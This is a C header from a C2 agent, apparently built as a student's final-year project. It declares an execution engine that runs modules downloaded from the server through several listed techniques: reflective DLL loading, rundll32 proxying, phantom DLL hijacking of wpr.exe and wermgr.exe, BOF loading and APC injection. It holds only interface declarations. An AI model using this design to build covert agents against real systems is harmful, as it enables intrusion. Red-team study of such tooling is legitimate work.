/*
 * ============================================================
 *  execution_engine.h - Moteur d'execution multi-technique
 *
 *  Techniques supportees :
 *    TECHNIQUE_RDLL      (T1620)      - Reflective DLL Loading
 *    TECHNIQUE_RUNDLL32  (T1218.011)  - Signed Binary Proxy (rundll32.exe)
 *    TECHNIQUE_WPR       (T1574.002)  - Phantom DLL hijacking (wpr.exe)
 *    TECHNIQUE_WERMGR    (T1574.002)  - Phantom DLL hijacking (wermgr.exe)
 *    TECHNIQUE_BOF       (T1620)      - COFF/BOF Loader (Beacon Object File)
 *
 *  Utilisation dans core.c :
 *    module_result_t r = execute_module(TECHNIQUE_RDLL, bytes, size, args, len);
 *    module_result_t r = execute_module(TECHNIQUE_RUNDLL32, bytes, size, args, len);
 *    free_module_result(&r);
 *
 *  Auteur  : El Mazdougui Anass
 *  Date    : Mai 2026
 *  Projet  : Framework C2 Modulaire - PFE INPT 2026
 * ============================================================
 */
#ifndef EXECUTION_ENGINE_H
#define EXECUTION_ENGINE_H

#include "platform.h"

/* ============================================================
 *  IDENTIFIANTS DE TECHNIQUES
 * ============================================================ */

typedef enum {
    TECHNIQUE_RDLL     = 1,  /* Reflective DLL (.dll) - T1620      */
    TECHNIQUE_RUNDLL32 = 2,  /* rundll32.exe proxy  - T1218.011    */
    TECHNIQUE_WPR      = 3,  /* wpr.exe phantom DLL - T1574.002    */
    TECHNIQUE_WERMGR   = 4,  /* wermgr.exe phantom DLL - T1574.002 */
    TECHNIQUE_BOF      = 5,  /* COFF/BOF loader     - T1620        */
    TECHNIQUE_APC      = 6,  /* APC Injection        - T1055       */
    TECHNIQUE_APCINJECT = 7, /* APC cross-process    - T1055.004   */
    TECHNIQUE_DEFAULT  = TECHNIQUE_RDLL
} technique_t;

/* ============================================================
 *  RESULTAT D'EXECUTION UNIFORME
 *
 *  Retourne par execute_module() quelle que soit la technique.
 *  L'appelant DOIT appeler free_module_result(&result) apres usage.
 * ============================================================ */
typedef struct {
    int            status;    /* 0 = succes, -1 = erreur loader, -2 = non impl. */
    unsigned char *data;      /* Sortie du module (malloc - peut etre NULL)     */
    size_t         data_len;  /* Taille des donnees en bytes                    */
    char          *error_msg; /* Message d'erreur si status != 0 (malloc)       */
} module_result_t;

/* ============================================================
 *  INTERFACE PUBLIQUE
 * ============================================================ */

/**
 * Initialise le moteur d'execution.
 * Appelee une fois au demarrage de l'agent dans main().
 * Retourne 0 si succes, -1 si erreur fatale.
 */
int  init_execution_engine(void);

/**
 * Libere les ressources globales du moteur.
 * Appelee a l'arret de l'agent.
 */
void cleanup_execution_engine(void);

/**
 * Dispatcher principal - route vers le loader selon la technique.
 *
 * @param technique    Technique choisie (BOF, RDLL, shellcode, src)
 * @param module_bytes Bytes bruts du module telecharge depuis le serveur
 * @param module_size  Taille du module en bytes
 * @param args         Arguments packes pour le module (format BeaconDataParse)
 * @param args_len     Taille des arguments (0 si aucun)
 *
 * @return module_result_t - toujours appeler free_module_result() apres usage.
 */
module_result_t execute_module(
    technique_t          technique,
    const unsigned char *module_bytes,
    size_t               module_size,
    const unsigned char *args,
    size_t               args_len
);

/**
 * Libere la memoire d'un module_result_t.
 * Toujours appeler apres execute_module().
 */
void free_module_result(module_result_t *result);

/**
 * Convertit une chaine de technique ("bof", "rdll"?) en enum.
 * Retourne TECHNIQUE_DEFAULT si inconnu.
 */
technique_t technique_from_string(const char *name);

/**
 * Retourne le nom court d'une technique (pour URLs et logs).
 * Ex: TECHNIQUE_BOF > "bof"
 */
const char *technique_to_string(technique_t t);

#endif /* EXECUTION_ENGINE_H */
